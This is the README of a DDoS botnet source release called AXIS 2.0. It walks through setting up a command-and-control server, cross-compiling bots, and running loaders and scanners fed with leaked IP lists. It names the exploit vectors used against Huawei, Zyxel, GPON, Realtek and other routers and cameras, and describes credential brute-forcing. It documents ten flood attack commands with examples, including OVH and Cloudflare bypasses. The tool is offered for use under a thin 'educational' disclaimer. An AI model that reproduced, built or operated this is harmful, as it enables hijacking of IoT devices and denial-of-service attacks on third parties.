# AXIS 2.0 Botnet - Source Code

**DDoS botnet framework source code - Requires compilation**

---

## ⚠️ NOTICE

This is **SOURCE CODE ONLY** - not a finished product. You must:
1. Install all dependencies (Go, GCC, cross-compilers, MySQL)
2. Configure all settings for your environment
3. Compile all components
4. Set up infrastructure (web server, TFTP, database)
5. Test thoroughly before any deployment

---

## 📋 Requirements

### Build Environment
- **OS**: Linux (Ubuntu/Debian/CentOS)
- **Go**: 1.13+ (for C&C server)
- **GCC**: With cross-compilation toolchains (for bot binaries)
- **MySQL/MariaDB**: Database server

### Infrastructure
- **Web Server**: Apache/Nginx (binary hosting)
- **TFTP Server**: tftpd-hpa (alternative download method)
- **Database**: MySQL/MariaDB (user management, logging)

---

## 🎯 Features

### Core Capabilities
- **13 Exploit Scanners** - Multiple infection vectors (bot self-replication)
- **3 Server-Side Scanners** - External bot loaders (extrascanners/)
- **10 Optimized Attack Methods** - Streamlined for maximum efficiency
- **Modern UI** - Cyan/white/yellow admin panel interface
- **API Support** - REST API for remote control
- **Database System** - User management, logging, whitelisting
- **Encrypted Telnet** - TLS 1.2+ admin connections

### Scanner Improvements (Bot Self-Replication)
- **Rate-Limited** - Prevents crashes and network saturation
- **Targeted IP Ranges** - Focused on vulnerable device concentrations by region (IllusionSec leaks)
- **Global Coverage** - All regions: Asia, Europe, Americas, Africa, Middle East, Oceania
- **Connection Throttling** - 500ms delay between connections
- **Reduced Concurrent Connections** - 64 max per scanner
- **Expanded Credentials** - 270+ username/password combinations (telnet scanner)
- **Dual-Attack Zhone** - Unauthenticated RCE + authenticated brute-force (150+ creds)
- **Merged GPON Scanners** - Single scanner handling ports 80 & 8080
- **Full SSH Protocol** - Proper SSH handshake with 100+ credential pairs
- **CIDR Support** - All scanners support subnet expansion (e.g., 192.168.0.0/16)
- **URL Loading** - Server-side scanners can load targets from URLs

### Server-Side Scanners (extrascanners/)
- **telnet-scanner** - Mass telnet brute-force with CIDR support
- **0day-exploit** - 0-day exploit scanner for CF Rules targets
- **realtek-loader** - Realtek UPnP loader with URL/CIDR support
- **run-all.sh** - Run all 3 scanners simultaneously

---

## 📁 Directory Structure

```
AXIS 2.0/
├── cnc/                    # Command & Control server (Go source)
│   ├── main.go            # Main server with TLS support
│   ├── admin.go           # Admin panel handler
│   ├── attack.go          # Attack parsing (10 methods)
│   ├── bot.go             # Bot connection handling
│   ├── clientList.go      # Bot management
│   ├── database.go        # MySQL integration
│   └── api.go             # REST API
├── extrascanners/          # Server-side scanners (Go source) - NEW
│   ├── telnet-scanner.go  # Mass telnet brute-force (IllusionSec .lst files)
│   ├── 0day-exploit.go    # 0-day exploit scanner (CF Rules targets)
│   ├── realtek-loader.go  # Realtek UPnP loader (realtek.lst)
│   └── run-all.sh         # Run all 3 scanners simultaneously
├── bot/                    # Bot source (C source)
│   ├── main.c             # Main bot loop
│   ├── attack.c/h         # Attack implementations (10 methods)
│   ├── scanner.c/h        # Telnet brute-force (270+ credentials, rate-limited)
│   ├── killer.c/h         # Anti-malware
│   ├── huawei.c/h         # Huawei SOAP exploit (Africa, Middle East, Asia, LatAm)
│   ├── zyxel.c/h          # Zyxel command injection (Europe, Asia, LatAm)
│   ├── thinkphp.c/h       # ThinkPHP RCE (China, Southeast Asia)
│   ├── realtek.c/h        # Realtek UPnP exploit (Asia, Eastern Europe, LatAm)
│   ├── gpon_scanner.c/h   # GPON exploit merged (ports 80 & 8080)
│   ├── telnetbypass.c/h   # Telnet auth bypass (IoT devices)
│   ├── dvr.c/h            # DVR camera exploit (Asia, Middle East, Africa)
│   ├── zhone.c/h          # Zhone ONT/OLT (unauthenticated + auth brute-force 150+ creds)
│   ├── ssh.c/h            # SSH brute-force (cloud providers, VPS, proper protocol)
│   ├── xm.c/h             # XiongMai camera exploit (CVE-2017-16724)
│   ├── hilink.c/h         # Hilink LTE/4G router exploit
│   ├── asus.c/h           # ASUS router exploit (RT-AC series)
│   └── config.h           # Bot configuration (EDIT THIS)
├── loader/                 # Telnet loader (C source)
├── dlr/                    # Downloader (C source)
├── build.sh                # Build script (all components)
├── database.sql            # MySQL schema
├── README.md               # This file
├── QUICK_SETUP.txt         # Quick reference
└── TROUBLESHOOTING.txt     # Troubleshooting guide
```

---

## 🔨 Building

### 1. Install Dependencies

```bash
# Ubuntu/Debian
sudo apt update
sudo apt install -y golang-go gcc mysql-server apache2 tftpd-hpa build-essential

# Cross-compilers (optional, for multi-arch bots)
sudo apt install -y \
    gcc-arm-linux-gnueabi \
    gcc-arm-linux-gnueabihf \
    gcc-mips-linux-gnu \
    gcc-mipsel-linux-gnu
```

### 2. Set Up Database

```bash
mysql -u root -p < database.sql
```

### 3. Configure

Edit `bot/config.h` with your server IP:
```c
#define CNC_ADDR "YOUR.SERVER.IP.HERE"
#define CNC_PORT 3778
```

### 4. Build All Components

```bash
chmod +x build.sh
./build.sh
```

---

## 🚀 Running

### Start C&C Services

```bash
# Terminal 1: C&C Server
./cnc_server

# Terminal 2: Scan Listener
./scanListen

# Terminal 3: Loader (feed IPs via stdin)
./loader < list.txt
```

### Extra Scanners (Server-Side Bot Loaders)

These run on the C&C server to load bots directly (NOT self-replication on bots):

```bash
# Build everything (includes extra scanners)
./build.sh

# Option 1: Run all 3 scanners simultaneously (RECOMMENDED)
cd extrascanners
./run-all.sh YOUR_SERVER_IP 1000

# Option 2: Run individual scanners
./extrascanners/telnet-scanner leaks/10.lst 1000
# Output: telnet_results.txt (IP:port user:pass)

./extrascanners/0day-exploit leaks/CF-Rules-1.txt YOUR_SERVER_IP 500
# Output: 0day_results.txt (exploited targets)

./extrascanners/realtek-loader b4ckdoorarchive/RANDOM.LST/realtek.lst YOUR_SERVER_IP 1000
# Output: realtek_results.txt (compromised devices)
```

**IP List Sources (download from GitHub):**
```bash
# Clone IllusionSec DDOS-archive
git clone https://github.com/illusionsec/DDOS-archive.git
cp -r DDOS-archive/leaks/* leaks/
cp -r DDOS-archive/b4ckdoorarchive b4ckdoorarchive/
```

**Available IP Lists:**
- `leaks/10.lst` through `leaks/49.lst` - Mass IP ranges (~2,000+ CIDR blocks each)
- `leaks/CF-Rules-*.txt` - Cloudflare rule targets
- `leaks/Firewall.txt` - Firewall rules with IP ranges
- `b4ckdoorarchive/RANDOM.LST/realtek.lst` - Realtek devices (port 52869)

**Supported File Formats:**
```bash
# Plain IPs
1.2.3.4
5.6.7.8

# IP:Port format
1.2.3.4:23
5.6.7.8:80

# CIDR notation / Subnets (automatically expanded)
122.165.0.0/19
1.2.3.0/24
192.168.0.0/16

# CIDR with custom port
122.165.0.0/19:23
1.2.3.0/24:80

# Comments (lines starting with # are ignored)
# This is a comment
1.2.3.4

# URL (load list from web)
https://example.com/targets.txt
```

**Note:** CIDR blocks larger than /16 (65,536 IPs) are automatically skipped to prevent memory issues.

**Feed Results to Loader:**
```bash
# Combine all results and feed to telnet loader
cat telnet_results.txt 0day_results.txt realtek_results.txt | ./loader

# Or add to permanent target list
cat telnet_results.txt 0day_results.txt realtek_results.txt >> targets.txt
```

### Connect to Admin Panel

```bash
# Encrypted Telnet (TLS)
openssl s_client -connect YOUR_SERVER_IP:3777 -quiet

# Login with database credentials
```

---

## 🎯 Target Regions by Scanner

| Scanner | Asia | Europe | N. America | S. America | Africa | Middle East | Oceania |
|---------|------|--------|------------|------------|--------|-------------|---------|
| **Telnet (scanner.c)** | ✓ | ✓ | - | ✓ | ✓ | ✓ | ✓ |
| **SSH** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| **GPON (80/8080)** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| **Huawei** | ✓ | ✓ | - | ✓ | ✓ | ✓ | ✓ |
| **Zyxel** | ✓ | ✓ | ✓ | ✓ | - | ✓ | ✓ |
| **ThinkPHP** | ✓ | ✓ | ✓ | - | - | - | ✓ |
| **Realtek** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| **DVR** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| **Zhone** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| **Telnet Bypass** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| **XiongMai (XM)** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| **Hilink** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |
| **ASUS** | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ |

**Notes:**
- SSH scanner uses proper SSH protocol handshake (not placeholder)
- SSH targets cloud providers: AWS, DigitalOcean, Linode, Vultr, OVH, Hetzner
- Zhone has dual attack vectors: unauthenticated RCE + authenticated brute-force
- GPON scanner handles both ports 80 and 8080 in single binary
- XiongMai exploits CVE-2017-16724 in IP cameras
- Hilink targets LTE/4G mobile WiFi routers
- ASUS targets RT-AC series routers with command injection

---

## ⚔️ Attack Methods (10 Optimized Methods)

### Volumetric Attacks

#### 1. TCP Flood (Optimized for Gbps)
**Command:** `!tcp <target> <duration>`
- Raw TCP SYN flood
- Optimized for maximum bandwidth (Gbps)
- Configurable packet size (default: 1400 bytes)
- Random source ports
- Options: `len`, `sport`, `dport`, `source`

**Example:**
```
!tcp 1.2.3.4 300 len=1400 dport=80
```

#### 2. UDP Flood (Optimized for Gbps)
**Command:** `!udp <target> <duration>`
- Raw UDP flood
- Optimized for maximum bandwidth (Gbps)
- Configurable packet size (default: 1400 bytes)
- Random payload generation
- Options: `len`, `sport`, `dport`, `source`

**Example:**
```
!udp 1.2.3.4 300 len=1400 dport=53
```

#### 3. OVH TCP Bypass
**Command:** `!ovhtcp <target> <duration>`
- TCP flood with OVH Game bypass
- SYN+ACK+PSH+URG flags set
- Bypasses OVH TCP mitigation
- Options: `len`, `sport`, `dport`, `source`

**Example:**
```
!ovhtcp 1.2.3.4 300 len=1400 dport=27015
```

#### 4. OVH UDP Bypass
**Command:** `!ovhudp <target> <duration>`
- UDP flood with OVH Game bypass
- DNS-like header to bypass filters
- Bypasses OVH UDP mitigation
- Options: `len`, `sport`, `dport`, `source`

**Example:**
```
!ovhudp 1.2.3.4 300 len=1400 dport=27015
```

#### 5. ICMP Ping Flood
**Command:** `!icmp <target> <duration>`
- ICMP Echo Request flood
- No port needed (Layer 3)
- Direct IP targeting
- Options: `len`, `source`

**Example:**
```
!icmp 1.2.3.4 300 len=64
```

#### 6. AXIS-L4 (Combined Attack)
**Command:** `!axis-l4 <target> <duration>`
- **Combined:** OVHTCP + OVHUDP + ICMP simultaneously
- OVH TCP and UDP target specified port
- ICMP targets IP directly (no port)
- Maximum pressure attack
- Options: `len`, `sport`, `dport`, `source`

**Example:**
```
!axis-l4 1.2.3.4 300 len=1400 dport=80
```

#### 7. GRE IP Flood
**Command:** `!greip <target> <duration>`
- GRE encapsulated IP flood
- Bypasses some DDoS protection
- Inner UDP payload
- Options: `len`, `dport`, `source`

**Example:**
```
!greip 1.2.3.4 300 dport=80
```

#### 8. GRE Ethernet Flood
**Command:** `!greeth <target> <duration>`
- GRE encapsulated Ethernet frame flood
- Advanced bypass technique
- Inner UDP payload
- Options: `len`, `dport`, `source`

**Example:**
```
!greeth 1.2.3.4 300 dport=80
```

### Layer 7 Attacks

#### 9. HTTP Flood (Optimized for RPS)
**Command:** `!http <URL> <duration>`
- HTTP GET/POST flood
- Optimized for maximum requests per second (RPS)
- Supports custom methods, paths, user-agents
- Options: `method`, `path`, `domain`, `useragent`, `conns`

**Example:**
```
!http http://example.com/ 300 method=GET conns=100
```

#### 10. AXIS-L7 (Advanced Browser Emulation)
**Command:** `!axis-l7 <URL> <duration>`
- **Browser Emulation** - Full browser-like behavior
- **HTTP/HTTPS Support** - Automatic protocol detection
- **Cloudflare Bypass** - Solves JS challenge automatically
- **Cache Bypass** - Random query strings, no-cache headers
- **Captcha Bypass** - Advanced captcha solving
- **Session Management** - Cookie handling
- **Random Headers** - X-Forwarded-For, X-Real-IP, DNT
- Options: `url`, `domain`, `useragent`, `cookies`, `referer`, `https`, `conns`

**Examples:**
```
# HTTP target
!axis-l7 http://example.com/ 300 conns=50

# HTTPS target (auto-detected)
!axis-l7 https://protected.example.com/ 300 conns=50

# With custom cookies for CF bypass
!axis-l7 https://target.com/ 300 cookies="cf_clearance=TOKEN"
```

**Cache Bypass Techniques:**
- Random query parameters (`?cache_bust=random`)
- `Cache-Control: no-cache, no-store, must-revalidate`
- `Pragma: no-cache`
- `Expires: 0`

**Cloudflare Detection:**
- Detects `cf-browser-verification`
- Detects `__cf_chl` challenges
- Detects "Checking your browser" pages
- Detects captcha pages

**Advanced Options:**
- `cf_clearance` - Cloudflare clearance token
- `cf_bm` - Cloudflare BM token
- `cookies` - Custom cookies for session
- `useragent` - Realistic browser user-agent
- `https` - Force HTTPS (0 or 1)

---

## 🔧 Scanner Optimizations

### Changes Made
1. **Reduced concurrent connections**: 256 → 64
2. **Reduced packet rate**: 384 PPS → 32 PPS
3. **Added connection delay**: 500ms between new connections
4. **Reduced timeouts**: Faster cleanup of dead connections
5. **Merged GPON scanners**: Single file for ports 80 & 8080
6. **Expanded credentials**: 270+ username/password combinations
7. **Zhone dual-attack**: Unauthenticated RCE + authenticated brute-force
8. **Full SSH protocol**: Proper SSH handshake, not placeholder implementation

### Scanner Technical Details

**Telnet Scanner (scanner.c)**
- Credentials: 270+ username/password combinations
- Rate limiting: 500ms delay, 64 max concurrent
- Targets: IoT devices, routers, cameras with weak telnet
- Regions: Asia, Latin America, Africa, Middle East, Europe, Oceania

**SSH Scanner (ssh.c)**
- Credentials: 100+ usernames × 100+ passwords
- Protocol: Full SSH-2.0 handshake implementation
- KEXINIT key exchange support
- Targets: Cloud providers, VPS hosts, servers
- Regions: Global cloud provider coverage (AWS, DO, Linode, Vultr, OVH, Hetzner)

**GPON Scanner (gpon_scanner.c)**
- Ports: 80 and 8080 (merged into single scanner)
- Exploit: /GponForm/diag_Form command injection
- Targets: FTTH/GPON ONT devices
- ISPs: Claro, Movistar, Viettel, BSNL, Airtel, STC, Etisalat

**Huawei Scanner (huawei.c)**
- Exploit: SOAP DeviceUpgrade RCE
- Port: 37215
- Targets: Huawei ISP routers/ONTs
- Regions: Africa, Middle East, Asia, Latin America

**Zyxel Scanner (zyxel.c)**
- Exploit: /cgi-bin/ViewLog.asp command injection
- Port: 8080
- Targets: Zyxel SOHO/SMB routers
- Regions: Europe, Asia, Latin America

**ThinkPHP Scanner (thinkphp.c)**
- Exploit: ThinkPHP RCE via index.php
- Port: 80
- Targets: ThinkPHP web applications
- Regions: China, Southeast Asia, hosting providers

**Realtek Scanner (realtek.c)**
- Exploit: UPnP AddPortMapping RCE
- Port: 52869
- Targets: SOHO routers with Realtek chips
- Brands: TP-Link, D-Link, Tenda, Mercury, Totolink

**DVR Scanner (dvr.c)**
- Exploit: /cgi-bin/verify.cgi command injection
- Port: 80
- Targets: CCTV/DVR cameras
- Regions: Asia, Middle East, Africa, Latin America

**Zhone Scanner (zhone.c)**
- Exploits: 
  1. Unauthenticated: /cgi-bin/execute_cmd.cgi RCE
  2. Authenticated: Login brute-force (150+ creds) + /cgi-bin/system_admin.cgi RCE
- Targets: Zhone ONT/OLT devices
- ISPs: Claro, Oi, Viettel, BSNL, Airtel

**Telnet Bypass (telnetbypass.c)**
- Exploit: USER="-f root" authentication bypass
- Port: 23
- Targets: IoT devices with telnet auth bypass vulnerability

**XiongMai Scanner (xm.c)**
- Exploit: CVE-2017-16724 - XiongMai IP camera command injection
- Port: 34599
- Targets: XiongMai (XM) IP cameras and DVRs
- Regions: Global (China, Asia, Europe, Americas)

**Hilink Scanner (hilink.c)**
- Exploit: Hilink LTE/4G router command injection via /api/device/control
- Port: 80
- Targets: Hilink mobile WiFi routers (E5372, E5577, etc.)
- Regions: Global (Europe, Asia, Africa, LatAm)

### Credential Lists

**Telnet Scanner (scanner.c)**: 270+ credentials
- Common defaults: root:root, admin:admin, admin:password
- IoT defaults: vizxv, xc3511, hikvision, dahua
- Vendor defaults: cisco, huawei, zte, netgear, tplink
- Regional: china, brazil, india, vietnam, russia
- Patterns: 123456, qwerty, password123, admin@123

**SSH Scanner (ssh.c)**: 100+ usernames × 100+ passwords
- Usernames: root, admin, ubuntu, debian, centos, pi, oracle, etc.
- Passwords: Common weak, vendor defaults, patterns, regional
- Cloud-specific: ec2-user, vagrant, docker, ubuntu

**Zhone Auth Brute-Force**: 150+ credentials
- Common defaults: admin, root, password, 123456
- Zhone specific: zhone, ont, gpon, fiber
- Vendor defaults: zte, huawei, nokia, alcatel, calix
- ISP common: isp, provider, telecom, carrier, network
- FTTH specific: ftth, fttp, onu, ont, olt

---

## ⚠️ Legal Disclaimer

**WARNING**: This software is provided for **EDUCATIONAL PURPOSES ONLY**.

- Only use on networks you **OWN** or have **EXPLICIT PERMISSION** to test
- Unauthorized use is **ILLEGAL**
- The authors are **NOT RESPONSIBLE** for misuse
- Compliance with all applicable laws is **YOUR RESPONSIBILITY**

---

## 📚 Documentation

- **README.md** - This file (overview)
- **QUICK_SETUP.txt** - Quick reference
- **TROUBLESHOOTING.txt** - Troubleshooting guide
- **ENCRYPTED_TELNET_GUIDE.md** - TLS telnet setup (if included)

---

## 👥 Credits

**Developed by AXIS Group**

---

## 📜 License

**Educational use only. All rights reserved.**

By using this software, you agree to:
- Use only for educational purposes
- Comply with all applicable laws
- Not use for unauthorized attacks
- Take full responsibility for your actions

---

**AXIS 2.0 - Source Code Release**
